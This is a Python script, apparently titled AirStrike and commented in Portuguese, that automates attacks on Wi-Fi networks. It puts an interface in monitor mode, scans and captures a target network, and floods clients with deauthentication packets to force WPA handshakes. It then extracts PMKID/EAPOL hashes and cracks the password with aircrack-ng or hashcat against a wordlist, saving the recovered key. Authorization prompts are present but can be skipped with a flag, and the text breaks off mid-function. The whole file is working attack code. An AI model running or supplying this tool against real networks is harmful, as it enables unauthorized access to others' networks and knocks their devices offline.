#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AirStrike — auditoria automatizada de redes Wi-Fi (estilo Wifite), baseada nos
passos do "wi-fi hacking.txt".

Fluxo automatizado (mesmas ferramentas do arquivo de notas):
  1) airmon-ng  -> coloca a interface em modo monitor
  2) airodump-ng -> varre as redes ao alcance e mostra uma tabela
  3) airodump-ng -> captura pacotes da rede alvo (canal + BSSID)
  4) aireplay-ng -> teste de desconexão (opcional, para forçar o handshake)
  5) gzip        -> prepara a lista de senhas (rockyou.txt)
  6) aircrack-ng -> tenta descobrir a senha a partir do handshake capturado
  6b) hcxpcapngtool + hashcat -> alternativa PMKID: extrai os hashes no
       formato 22000 (PMKID/EAPOL) e quebra com hashcat -m 22000
  7) airmon-ng  -> restaura a interface e o NetworkManager ao final

USE APENAS EM REDES PRÓPRIAS OU COM AUTORIZAÇÃO EXPLÍCITA DO RESPONSÁVEL.

Requisitos (Kali Linux): aircrack-ng suite, iw, root (sudo).
Nenhuma dependência externa de Python (somente biblioteca padrão).
"""

import argparse
import os
import re
import shlex
import shutil
import signal
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------

__appname__ = "AirStrike"
__version__ = "1.0"

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(.+?)\s*\]")

# Cores (desativadas automaticamente se a saída não for um terminal)
USE_COLOR = sys.stdout.isatty()


class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"


def paint(text: str, color: str) -> str:
    if not USE_COLOR:
        return str(text)
    return f"{color}{text}{Color.RESET}"


def info(msg: str) -> None:
    print(paint("[*]", Color.CYAN), msg)


def ok(msg: str) -> None:
    print(paint("[+]", Color.GREEN), msg)


def warn(msg: str) -> None:
    print(paint("[!]", Color.YELLOW), msg)


def err(msg: str) -> None:
    print(paint("[-]", Color.RED), msg, file=sys.stderr)


# ---------------------------------------------------------------------------
# Banner (estilo Wifite): letras em blocos coloridas
# ---------------------------------------------------------------------------

_BANNER_GLYPHS = {
    "A": [" ### ", "#   #", "#####", "#   #", "#   #", "#   #"],
    "I": ["#####", "  #  ", "  #  ", "  #  ", "  #  ", "#####"],
    "R": ["#### ", "#   #", "#### ", "#  # ", "#   #", "#   #"],
    "S": ["#####", "#    ", "#####", "    #", "    #", "#####"],
    "T": ["#####", "  #  ", "  #  ", "  #  ", "  #  ", "  #  "],
    "K": ["#   #", "#  # ", "###  ", "#  # ", "#   #", "#   #"],
    "E": ["#####", "#    ", "#### ", "#    ", "#    ", "#####"],
}


def render_banner(text="AirStrike"):
    """Monta o texto em blocos. Devolve as 6 linhas (ou None)."""
    glyphs = [_BANNER_GLYPHS[c] for c in text.upper() if c in _BANNER_GLYPHS]
    if not glyphs:
        return None
    return [" ".join(g[r] for g in glyphs) for r in range(6)]


def print_banner():
    """Imprime o banner do AirStrike ("Air" ciano + "Strike" vermelho)."""
    linhas = render_banner(__appname__)
    if not linhas:
        linhas = [__appname__]
    n_air = 3  # letras "Air" em ciano, o restante em vermelho
    largura_air = n_air * 5 + (n_air - 1)
    print(paint("  " + "-" * 53, Color.CYAN))
    for linha in linhas:
        if len(linha) > largura_air:
            print("  " + paint(linha[:largura_air], Color.CYAN + Color.BOLD)
                  + " " + paint(linha[largura_air + 1:], Color.RED + Color.BOLD))
        else:
            print("  " + paint(linha, Color.CYAN + Color.BOLD))
    print(paint("  " + "-" * 53, Color.CYAN))
    print("  ", paint(f"{__appname__} {__version__}", Color.BOLD),
          "- auditoria automatizada de redes Wi-Fi (aircrack-ng + hcxtools + hashcat)")
    print("  ", paint("use somente em redes proprias ou com autorizacao explicita", Color.YELLOW))
    print()


# ---------------------------------------------------------------------------
# Utilitários de subprocesso
# ---------------------------------------------------------------------------

def run(cmd, timeout=None, stdin=subprocess.DEVNULL):
    """Executa um comando e devolve (codigo_saida, saida_completa)."""
    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=stdin,
            timeout=timeout,
            encoding="utf-8",
            errors="replace",
        )
        return proc.returncode, proc.stdout or ""
    except FileNotFoundError:
        return 127, f"comando nao encontrado: {cmd[0]}"
    except subprocess.TimeoutExpired as exc:
        out = ""
        if exc.stdout:
            out = exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode("utf-8", "replace")
        return -1, out


def require_tools():
    faltando = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not shutil.which(t)]
    if not shutil.which("iw"):
        warn("comando 'iw' nao encontrado; a deteccao de interfaces pode falhar")
    if faltando:
        err("ferramentas ausentes: " + ", ".join(faltando))
        err("instale a suite com: sudo apt install aircrack-ng")
        sys.exit(1)
    if not shutil.which("hcxpcapngtool"):
        warn("hcxpcapngtool ausente (hcxtools): ataque PMKID desativado | sudo apt install hcxtools")
    if not shutil.which("hashcat"):
        warn("hashcat ausente: quebra via PMKID/22000 indisponivel | sudo apt install hashcat")


# ---------------------------------------------------------------------------
# Interfaces sem fio / modo monitor
# ---------------------------------------------------------------------------

def list_ifaces_with_type():
    """Devolve um dict {nome: tipo} das interfaces wireless (via iw dev)."""
    ifaces = {}
    _, out = run(["iw", "dev"])
    atual = None
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m:
            atual = m.group(1)
            continue
        m = re.match(r"\s*type\s+(\S+)", line)
        if m and atual:
            ifaces[atual] = m.group(1)
            atual = None
    return ifaces


def find_wireless_iface():
    """Procura uma interface wireless em modo managed (para o modo monitor)."""
    ifaces = list_ifaces_with_type()
    for nome, tipo in ifaces.items():
        if tipo == "managed":
            return nome
    for nome, tipo in ifaces.items():
        if tipo == "monitor":
            return nome  # ja esta em monitor; tratado depois
    return None


def setup_monitor(iface=None):
    """Ativa o modo monitor. Devolve (iface_monitor, matou_processos)."""
    if iface is None:
        iface = find_wireless_iface()
    if iface is None:
        err("nenhuma interface wireless encontrada (antena conectada? driver instalado?)")
        sys.exit(1)

    ifaces_antes = list_ifaces_with_type()
    if ifaces_antes.get(iface) == "monitor":
        ok(f"{iface} ja esta em modo monitor")
        return iface, False

    info("encerrando processos que conflitam com o modo monitor (airmon-ng check kill)")
    run(["airmon-ng", "check", "kill"])

    info(f"ativando modo monitor em {iface} (airmon-ng start)")
    rc, out = run(["airmon-ng", "start", iface], timeout=30)

    # Tenta extrair o nome da interface monitor do output do airmon-ng
    m = re.search(r"monitor mode enabled on ([^\s)]+)", out)
    if m:
        return m.group(1), True
    m = re.search(r"monitor mode vif enabled for \[phy\d+\]\S+ on \[phy\d+\]([^\s)]+)", out)
    if m:
        return m.group(1), True

    # Fallback: compara as interfaces antes e depois
    time.sleep(2)
    for nome, tipo in list_ifaces_with_type().items():
        if tipo == "monitor" and nome not in ifaces_antes:
            return nome, True
    if ifaces_antes.get(iface) == "monitor":
        return iface, True

    err("nao foi possivel confirmar o modo monitor")
    err("saida do airmon-ng:\n" + out)
    sys.exit(1)


def restore_setup(monitor_iface, matou_processos):
    """Para o modo monitor e restaura o NetworkManager se precisarmos."""
    if monitor_iface:
        info(f"parando modo monitor ({monitor_iface})")
        run(["airmon-ng", "stop", monitor_iface], timeout=30)
    if matou_processos:
        info("restaurando servicos de rede")
        run(["systemctl", "start", "NetworkManager"], timeout=30)
        run(["systemctl", "start", "wpa_supplicant"], timeout=30)
    # Volta a interface para managed (caso o airmon-ng tenha deixado parada)
    ifaces = list_ifaces_with_type()
    base = monitor_iface[:-3] if monitor_iface and monitor_iface.endswith("mon") else monitor_iface
    if base and ifaces.get(base) != "managed":
        run(["ip", "link", "set", base, "up"], timeout=15)
        run(["iw", "dev", base, "set", "type", "managed"], timeout=15)


# ---------------------------------------------------------------------------
# Varredura de redes (airodump-ng -> CSV)
# ---------------------------------------------------------------------------

def parse_airodump_csv(path):
    """Le um CSV do airodump-ng. Devolve (redes, clientes).

    redes:  lista de dicts (bssid, channel, privacy, cipher, auth, power,
            ivs, essid, clients)
    clientes: lista de dicts (station, bssid)
    """
    redes = []
    clientes = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            linhas = fh.read().splitlines()
    except OSError:
        return redes, clientes

    secao = None
    for line in linhas:
        s = line.strip()
        if not s:
            continue
        if s.startswith("BSSID,"):
            secao = "net"
            continue
        if s.startswith("Station MAC,"):
            secao = "sta"
            continue
        if s.lower().startswith("airodump"):
            continue

        campos = [c.strip() for c in line.split(",")]

        if secao == "net":
            if len(campos) < 13 or not BSSID_RE.match(campos[0]):
                continue
            # ESSID pode conter virgulas (e espacos): junta os campos brutos do
            # miolo e descarta a ultima coluna (Key), que vem depois dele.
            brutos = line.split(",")
            if len(brutos) >= 15:
                essid = ",".join(brutos[13:-1]).strip()
            elif len(brutos) == 14:
                essid = brutos[13].strip()
            else:
                essid = ""
            redes.append({
                "bssid": campos[0].upper(),
                "channel": campos[3],
                "privacy": campos[5] if len(campos) > 5 else "",
                "cipher": campos[6] if len(campos) > 6 else "",
                "auth": campos[7] if len(campos) > 7 else "",
                "power": campos[8] if len(campos) > 8 else "",
                "ivs": _int(campos[10] if len(campos) > 10 else "0"),
                "essid": essid,
                "clients": 0,
            })
        elif secao == "sta":
            if len(campos) < 6 or not BSSID_RE.match(campos[0]):
                continue
            clientes.append({
                "station": campos[0].upper(),
                "bssid": campos[5].upper(),
            })

    contagem = {}
    for c in clientes:
        contagem[c["bssid"]] = contagem.get(c["bssid"], 0) + 1
    for r in redes:
        r["clients"] = contagem.get(r["bssid"], 0)

    return redes, clientes


def _int(texto):
    try:
        return int(str(texto).strip())
    except (TypeError, ValueError):
        return 0


def _power_int(texto):
    v = _int(texto)
    return v if v != 0 else -999


def scan_networks(monitor_iface, seconds, out_dir):
    """Roda o airodump-ng por N segundos e devolve as redes encontradas."""
    prefix = os.path.join(out_dir, "scan_%s" % time.strftime("%Y%m%d_%H%M%S"))
    cmd = ["airodump-ng", "--output-format", "csv", "-w", prefix, monitor_iface]
    info(f"varrendo redes por {seconds}s (ou ate Ctrl+C para parar e escolher)")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except OSError as exc:
        err(f"falha ao iniciar o airodump-ng: {exc}")
        sys.exit(1)
    try:
        time.sleep(seconds)
    except KeyboardInterrupt:
        warn("varredura interrompida; mostrando as redes ja capturadas...")
    finally:
        _stop_process(proc)

    csv_path = prefix + "-01.csv"
    if not os.path.exists(csv_path):
        err(f"o airodump-ng nao gerou o arquivo {csv_path}")
        sys.exit(1)
    redes, _ = parse_airodump_csv(csv_path)
    redes.sort(key=lambda r: _power_int(r["power"]), reverse=True)
    return redes


def print_networks(redes):
    if not redes:
        warn("nenhuma rede encontrada. Aumente o tempo (--scan-time) ou verifique a antena.")
        return
    print()
    print(paint("  #   BSSID              CH   POW    ENC            ESSID", Color.BOLD))
    print("  " + "-" * 68)
    for i, r in enumerate(redes, 1):
        essid = r["essid"] or paint("<oculta>", Color.YELLOW)
        enc = (r["privacy"] or "?").strip()
        print("  %-3d %-18s %-4s %-6s %-14s %s" % (
            i, r["bssid"], r["channel"], r["power"] or "?", enc, essid))
    print()


# ---------------------------------------------------------------------------
# Captura dirigida + desconexão
# ---------------------------------------------------------------------------

def start_capture(monitor_iface, bssid, channel, out_dir, log_path):
    prefix = os.path.join(out_dir, "captura_%s" % time.strftime("%Y%m%d_%H%M%S"))
    cmd = ["airodump-ng", "--bssid", bssid, "-c", str(channel),
           "--output-format", "pcap,csv", "-w", prefix, monitor_iface]
    info(f"capturando a rede {bssid} (canal {channel}): {' '.join(cmd)}")
    try:
        log_fh = open(log_path, "a", encoding="utf-8")
    except OSError:
        log_fh = subprocess.DEVNULL
    proc = subprocess.Popen(cmd, stdout=log_fh, stderr=subprocess.STDOUT)
    time.sleep(3)
    if proc.poll() is not None:
        err("o airodump-ng encerrou imediatamente; verifique o canal e a interface")
        err(f"log: {log_path}")
        sys.exit(1)
    return proc, prefix


def _stop_process(proc, timeout=8):
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.send_signal(signal.SIGINT)  # Ctrl+C: finaliza gravando os arquivos
    except Exception:
        pass
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


def read_capture_stats(prefix, bssid):
    """Le o CSV da captura dirigida. Devolve (ivs, clientes_associados)."""
    csv_path = prefix + "-01.csv"
    redes, clientes = parse_airodump_csv(csv_path)
    for r in redes:
        if r["bssid"] == bssid.upper():
            assoc = len([c for c in clientes if c["bssid"] == bssid.upper()])
            return r["ivs"], assoc
    return 0, len([c for c in clientes if c["bssid"] == bssid.upper()])


def send_deauth(monitor_iface, bssid, count, timeout=15):
    """Teste de desconexão (aireplay-ng -0 N -a BSSID)."""
    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, monitor_iface]
    info(f"enviando {count} pacotes de desautenticacao: {' '.join(cmd)}")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(min(timeout, 10))
    except OSError as exc:
        warn(f"nao foi possivel executar o aireplay-ng: {exc}")
        return
    _stop_process(proc)


def wait_handshake(prefix, bssid, monitor_iface, capture_time, deauth_count,
                   deauth_interval, iv_target):
    """Loop da captura: faz deauth periodico e procura handshake/PMKID.

    Devolve "handshake", "pmkid", "ivs" (WEP) ou "none".
    """
    redes, _ = parse_airodump_csv(prefix + "-01.csv")
    enc = ""
    for r in redes:
        if r["bssid"] == bssid.upper():
            enc = (r["privacy"] or "").upper()
            break

    wep = "WEP" in enc
    inicio = time.time()
    ultimo_deauth = 0.0
    ultimo_status = 0.0

    info(f"aguardando ate {capture_time}s por {'IVs suficientes (WEP)' if wep else 'handshake/PMKID (WPA)'}... (Ctrl+C para pular)")
    try:
        while True:
            elapsed = time.time() - inicio
            if elapsed > capture_time:
                break

            ivs, clientes = read_capture_stats(prefix, bssid)

            if deauth_count > 0 and not wep:
                if clientes == 0 and elapsed > 20:
                    # Sem cliente associado o deauth nao adianta; apenas espera
                    if time.time() - ultimo_status > 15:
                        warn("nenhum cliente associado ao alvo; aguardando conexao (deauth pausado)")
                        ultimo_status = time.time()
                    time.sleep(2)
                    continue
                if elapsed == 0 or time.time() - ultimo_deauth >= deauth_interval:
                    send_deauth(monitor_iface, bssid, deauth_count)
                    ultimo_deauth = time.time()

            if wep:
                if time.time() - ultimo_status >= 10:
                    info(f"[{int(elapsed):>3}s] IVs capturados: {ivs} (alvo: {iv_target}) | clientes: {clientes}")
                    ultimo_status = time.time()
                if ivs >= iv_target:
                    ok(f"quantidade de IVs suficiente ({ivs})")
                    return "ivs"
            else:
                if time.time() - ultimo_status >= 15:
                    cap = prefix + "-01.cap"
                    hs = has_handshake(cap, bssid)
                    pmkid_n = eapol_n = 0
                    if hs is not True:
                        r = extract_22000(cap, prefix + "_check.22000", bssid)
                        if r:
                            pmkid_n, eapol_n = r
                    if hs is True or eapol_n > 0:
                        ok("handshake WPA capturado!")
                        return "handshake"
                    if pmkid_n > 0:
                        ok(f"PMKID capturado ({pmkid_n}x)!")
                        return "pmkid"
                    info(f"[{int(elapsed):>3}s] IVs: {ivs} | clientes: {clientes} | "
                         f"handshake: {'sim' if hs else 'nao'} | PMKID: {pmkid_n}")
                    ultimo_status = time.time()

            time.sleep(2)
    except KeyboardInterrupt:
        warn("captura interrompida pelo usuario")

    return "none"


def has_handshake(cap_file, bssid):
    """Verifica se o .cap contem handshake WPA do alvo.

    True / False quando consegue determinar; None quando nao foi possivel.
    """
    if not os.path.exists(cap_file):
        return False
    # /dev/null funciona como lista de senhas vazia: se existir handshake o
    # aircrack-ng reclama da "senha nao encontrada"; senao, ele avisa que nao
    # ha handshakes validos.
    rc, out = run(["aircrack-ng", "-a2", "-b", bssid, "-w", "/dev/null", cap_file], timeout=20)
    baixo = out.lower()
    if "no valid wpa handshake" in baixo or "no valid handshakes" in baixo:
        return False
    if "key found" in baixo or "passphrase not in dictionary" in baixo:
        return True
    # Fallback: lista de redes do aircrack-ng mostra "(1 handshake)"
    m = re.search(r"(\d+)\s+handshake", out)
    if m:
        return int(m.group(1)) > 0
    return None


# ---------------------------------------------------------------------------
# PMKID (hcxpcapngtool + hashcat -m 22000)
# ---------------------------------------------------------------------------

def count_hashes_in_22000(path, bssid=None):
    """Conta hashes PMKID (WPA*01*) e EAPOL (WPA*02*) de um arquivo .22000.

    Se bssid for informado, conta somente as linhas daquele AP (no formato
    22000 o MAC do AP aparece sem dois-pontos, no campo 4).
    Devolve (pmkid, eapol).
    """
    pmkid = eapol = 0
    alvo = bssid.replace(":", "").lower() if bssid else None
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                campos = line.strip().upper().split("*")
                if len(campos) < 5 or campos[0] != "WPA":
                    continue
                if alvo and campos[3].lower() != alvo:
                    continue
                if campos[1] == "01":
                    pmkid += 1
                elif campos[1] == "02":
                    eapol += 1
    except OSError:
        pass
    return pmkid, eapol


def extract_22000(cap_file, out_file, bssid=None):
    """Extrai handshakes/PMKID do .cap para o formato hashcat 22000.

    Usa o hcxpcapngtool (hcxtools). Devolve (pmkid, eapol) do AP alvo,
    ou None se o hcxpcapngtool nao estiver instalado.
    """
    if not shutil.which("hcxpcapngtool"):
        return None
    if not os.path.exists(cap_file):
        return (0, 0)
    try:
        if os.path.exists(out_file):
            os.remove(out_file)  # evita acumular hashes de execucoes antigas
    except OSError:
        pass
    run(["hcxpcapngtool", "-o", out_file, cap_file], timeout=120)
    if not os.path.exists(out_file):
        return (0, 0)
    return count_hashes_in_22000(out_file, bssid)


def crack_hashcat(hash_file, wordlist, extra_args=None):
    """Quebra um .22000 com o hashcat (-m 22000). Devolve a chave ou None."""
    if not os.path.exists(hash_file):
        err(f"arquivo de hashes nao encontrado: {hash_file}")
        return None

    out_file = os.path.splitext(hash_file)[0] + "_chave.txt"
    try:
        if os.path.exists(out_file):
            os.remove(out_file)
    except OSError:
        pass

    cmd = ["hashcat", "-m", "22000", "-a", "0",
           "--outfile", out_file, "--outfile-format", "2"]
    if extra_args:
        cmd += list(extra_args)
    cmd += [hash_file, wordlist]
    info(f"testando senhas (hashcat): {' '.join(cmd)}")
    print(paint("-" * 60, Color.CYAN))

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            encoding="utf-8",
            errors="replace",
        )
        for line in proc.stdout:
            for parte in line.replace("\r", "\n").split("\n"):
                p = parte.strip()
                if not p:
                    continue
                if any(t in p for t in ("Status", "Cracked", "Exhausted", "Recovered",
                                        "Approaching", "Hashfile", "ERROR", "error",
                                        "No password hashes", "Backend", "Kernel",
                                        "CUDA", "OpenCL", "INFO")):
                    print(parte)
        proc.wait()
    except KeyboardInterrupt:
        warn("quebra interrompida pelo usuario")
        try:
            proc.kill()
        except Exception:
            pass

    print(paint("-" * 60, Color.CYAN))

    chave = None
    if os.path.isfile(out_file):
        try:
            with open(out_file, "r", encoding="utf-8", errors="replace") as fh:
                chave = fh.read().strip() or None
        except OSError:
            pass
    if chave is None:
        # Senha ja encontrada antes fica no potfile; o --show a recupera
        show_file = out_file + ".show"
        run(["hashcat", "-m", "22000", "--show", "--outfile", show_file,
             "--outfile-format", "2", hash_file], timeout=60)
        if os.path.isfile(show_file):
            try:
                with open(show_file, "r", encoding="utf-8", errors="replace") as fh:
                    chave = fh.read().strip() or None
            except OSError:
                pass
    return chave


# ---------------------------------------------------------------------------
# Lista de senhas (rockyou)
# ---------------------------------------------------------------------------

def prepare_wordlist(path):
    """Garante que a lista de senhas existe (descompacta o .gz se preciso)."""
    if path and os.path.isfile(path):
        ok(f"lista de senhas: {path}")
        return path

    gz = (path or DEFAULT_WORDLIST) + ".gz"
    if os.path.isfile(gz):
        info(f"descompactando {gz} (gzip -dk, mantem o original)")
        rc, _ = run(["gzip", "-dk", gz], timeout=300)
        if rc == 0 and os.path.isfile(path):
            ok(f"lista de senhas pronta: {path}")
            return path
        warn("nao foi possivel descompactar automaticamente; rode manualmente:")
        warn(f"  sudo gzip -dk {gz}")

    return None


# ---------------------------------------------------------------------------
# Quebra de senha (aircrack-ng)
# ---------------------------------------------------------------------------

def crack(cap_file, wordlist, bssid):
    """Roda o aircrack-ng em tempo real. Devolve a chave encontrada ou None."""
    if not os.path.exists(cap_file):
        err(f"arquivo de captura nao encontrado: {cap_file}")
        return None

    log_file = os.path.splitext(cap_file)[0] + "_chave.txt"
    cmd = ["aircrack-ng", "-b", bssid, "-w", wordlist, "-l", log_file, cap_file]
    info(f"testando senhas: {' '.join(cmd)}")
    print(paint("-" * 60, Color.CYAN))

    chave = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            encoding="utf-8",
            errors="replace",
        )
        buffer = ""
        for line in proc.stdout:
            for parte in line.replace("\r", "\n").split("\n"):
                if not parte.strip():
                    continue
                m = KEY_FOUND_RE.search(parte)
                if m:
                    chave = m.group(1)
                # Mostra apenas linhas uteis (evita o spam de progresso)
                if any(t in parte for t in ("KEY FOUND", "KEY RECOVERED", "handshake",
                                            "dictionary", "quitting", "keys tested",
                                            "Passphrase", "Attempting", "Opening", "Read ")):
                    print(parte)
        proc.wait()
    except KeyboardInterrupt:
        warn("quebra interrompida pelo usuario")
        try:
            proc.kill()
        except Exception:
            pass

    print(paint("-" * 60, Color.CYAN))

    if chave is None and os.path.isfile(log_file):
        try:
            with open(log_file, "r", encoding="utf-8", errors="replace") as fh:
                chave = fh.read().strip() or None
        except OSError:
            pass
    return chave


def save_result(out_dir, bssid, essid, key):
    path = os.path.join(out_dir, "resultado_%s.txt" % time.strftime("%Y%m%d_%H%M%S"))
    try:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("Data: %s\n" % time.strftime("%Y-%m-%d %H:%M:%S"))
            fh.write("BSSID: %s\n" % bssid)
            fh.write("ESSID: %s\n" % (essid or "(oculta)"))
            fh.write("Chave: %s\n" % key)
        ok(f"resultado salvo em {path}")
    except OSError as exc:
        warn(f"nao foi possivel salvar o resultado: {exc}")


# ---------------------------------------------------------------------------
# Entrada interativa
# ---------------------------------------------------------------------------

def choose_target(redes, args):
    """Escolhe o alvo: automático (--bssid) ou menu interativo."""
    if args.bssid:
        bssid = args.bssid.upper()
        for r in redes:
            if r["bssid"] == bssid:
                return r
        if args.channel:
            warn(f"{bssid} nao apareceu na varredura; usando canal manual {args.channel}")
            return {"bssid": bssid, "channel": str(args.channel), "privacy": "WPA2",
                    "cipher": "CCMP", "auth": "PSK", "power": "?", "ivs": 0,
                    "essid": args.essid or "", "clients": 0}
        err(f"{bssid} nao foi encontrada na varredura; informe tambem --channel")
        sys.exit(1)

    if not redes:
        err("nenhum alvo para escolher")
        sys.exit(1)
    if not sys.stdin.isatty():
        err("sem terminal interativo: use --bssid (e --channel se necessario)")
        sys.exit(1)

    try:
        resp = input("Numero do alvo (ou Enter para sair): ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    if not resp:
        return None
    try:
        idx = int(resp)
    except ValueError:
        err("entrada invalida")
        return None
    if not 1 <= idx <= len(redes):
        err("numero fora do intervalo")
        return None
    return redes[idx - 1]


def confirm_authorization(args):
    if args.yes:
        warn("--yes informado: voce atesta ter autorizacao para testar estas redes")
        return
    print(paint("=" * 60, Color.YELLOW))
    print(paint("  AVISO: teste apenas em redes PROPRIAS ou com AUTORIZACAO", Color.YELLOW))
    print(paint("  EXPLICITA do responsavel. O teste de desconexao derruba", Color.YELLOW))
    print(paint("  dispositivos conectados e pode ser ilegal sem autorizacao.", Color.YELLOW))
    print(paint("=" * 60, Color.YELLOW))
    try:
        resp = input("Digite AUTORIZADO para continuar: ").strip()
    except (EOFError, KeyboardInterrupt):
        resp = ""
    if resp != "AUTORIZADO":
        err("confirmacao nao recebida. Abortando.")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Principal
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        description="AirStrike: automatiza os passos do wi-fi hacking.txt "
                    "(airmon/airodump/aireplay/aircrack + PMKID via hcxtools/hashcat). "
                    "Use somente com autorizacao.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--iface", help="interface wireless (padrao: auto-detectada)")
    p.add_argument("--monitor", dest="monitor", help="interface ja em modo monitor (pula o setup)")
    p.add_argument("--scan-time", type=int, default=15, help="segundos de varredura")
    p.add_argument("--bssid", help="BSSID do alvo (pula o menu interativo)")
    p.add_argument("--channel", help="canal do alvo (usado com --bssid se a varredura nao achar)")
    p.add_argument("--essid", help="nome (ESSID) do alvo, apenas para registro")
    p.add_argument("--wordlist", default=DEFAULT_WORDLIST, help="lista de senhas")
    p.add_argument("--deauth", type=int, default=10, help="pacotes de desauth por rodada (0 = desativa)")
    p.add_argument("--deauth-interval", type=int, default=15, help="segundos entre rodadas de deauth")
    p.add_argument("--capture-time", type=int, default=180, help="tempo maximo de captura (s)")
    p.add_argument("--iv-target", type=int, default=20000, help="IVs minimos para o ataque WEP")
    p.add_argument("--cracker", choices=("auto", "aircrack", "hashcat"), default="auto",
                   help="quebrador WPA (auto: hashcat se houver hash PMKID/EAPOL extraido)")
    p.add_argument("--hashcat-args", default="",
                   help="argumentos extras do hashcat entre aspas, ex: '--force -D 1'")
    p.add_argument("--out", default="captures", help="pasta para capturas e resultados")
    p.add_argument("--no-crack", action="store_true", help="para apos a captura, sem testar senhas")
    p.add_argument("--keep", action="store_true", help="nao restaura a interface ao final")
    p.add_argument("--yes", "-y", action="store_true", help="pula o aviso de autorizacao")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)

    if os.geteuid() != 0:
        err("execute com sudo: sudo python3 airstrike.py")
        sys.exit(1)

    print_banner()

    require_tools()
    confirm_authorization(args)

    os.makedirs(args.out, exist_ok=True)

    monitor_iface = None
    matou_processos = False
    capture_proc = None
    found_key = None
    target = None
    prefix = None

    try:
        # 1) Modo monitor --------------------------------------------------
        if args.monitor:
            monitor_iface = args.monitor
            ifaces = list_ifaces_with_type()
            if ifaces and ifaces.get(monitor_iface) != "monitor":
                warn(f"{monitor_iface} nao parece estar em modo monitor (tipo: {ifaces.get(monitor_iface)})")
            ok(f"usando interface em modo monitor: {monitor_iface}")
        else:
            monitor_iface, matou_processos = setup_monitor(args.iface)
            ok(f"modo monitor ativo em {monitor_iface}")

        # 2) Varredura -----------------------------------------------------
        redes = scan_networks(monitor_iface, max(5, args.scan_time), args.out)
        print_networks(redes)
        if args.scan_time == 0 and not (args.bssid and args.channel):
            err("sem varredura: informe --bssid e --channel")
            sys.exit(1)

        # 3) Alvo ----------------------------------------------------------
        target = choose_target(redes, args)
        if target is None:
            info("nenhum alvo selecionado. Encerrando.")
            return 0
        channel = target.get("channel") or args.channel
        if not channel or not str(channel).isdigit():
            err("canal do alvo desconhecido; informe --channel")
            sys.exit(1)
        bssid = target["bssid"]
        essid = target.get("essid") or (args.essid or "")
        enc = (target.get("privacy") or "").upper()
        ok(f"alvo: {essid or '(oculta)'} [{bssid}] canal {channel} ({enc or '?'})")

        if "SAE" in enc or "WPA3" in enc:
            warn("rede WPA3/SAE: nao sera quebrada por wordlist (exige PMF desativada)")
        if "MGT" in (target.get("auth") or "").upper():
            warn("rede enterprise (802.1X): a wordlist nao se aplica")

        # 4) Captura dirigida ----------------------------------------------
        capture_proc, prefix = start_capture(monitor_iface, bssid, channel,
                                             args.out, os.path.join(args.out, "airodump.log"))
        cap_file = prefix + "-01.cap"

        deauth_count = args.deauth
        if deauth_count > 0:
            info("etapa de teste de desconexao (aireplay-ng) habilitada")
        else:
            info("teste de desconexao desabilitado (--deauth 0)")

        got = wait_handshake(prefix, bssid, monitor_iface,
                             capture_time=max(30, args.capture_time),
                             deauth_count=deauth_count,
                             deauth_interval=max(5, args.deauth_interval),
                             iv_target=args.iv_target)
        if got not in ("handshake", "pmkid", "ivs"):
            if "WEP" in enc:
                warn("quantidade de IVs insuficiente; tentando mesmo assim")
            else:
                warn("nem handshake nem PMKID confirmados durante a captura; tentando mesmo assim")
                hs = has_handshake(cap_file, bssid)
                if hs is False:
                    warn("sem handshake no .cap: aumente --capture-time e mantenha clientes conectados")
                    warn("ou capture com hcxdumptool para obter PMKID diretamente")

        # 5) Parar captura -------------------------------------------------
        _stop_process(capture_proc)
        capture_proc = None
        time.sleep(1)

        if args.no_crack:
            info(f"captura salva em {cap_file} (quebra pulada por --no-crack)")
            return 0

        # 6) Lista de senhas ------------------------------------------------
        wordlist = prepare_wordlist(args.wordlist)
        if wordlist is None:
            if not sys.stdin.isatty():
                err("lista de senhas nao encontrada; informe com --wordlist")
                return 1
            try:
                resp = input("Caminho de outra lista de senhas (Enter para abortar a quebra): ").strip()
            except (EOFError, KeyboardInterrupt):
                resp = ""
            wordlist = resp if resp and os.path.isfile(resp) else None
        if wordlist is None:
            warn("sem lista de senhas; a captura ficou salva em %s" % cap_file)
            return 1

        # 7) Quebra ---------------------------------------------------------
        if "WEP" in enc:
            info("rede WEP: aircrack-ng tenta recuperar a chave sem wordlist")
            log_file = os.path.splitext(cap_file)[0] + "_chave.txt"
            proc = subprocess.Popen(["aircrack-ng", "-b", bssid, "-l", log_file, cap_file],
                                    stdin=subprocess.DEVNULL)
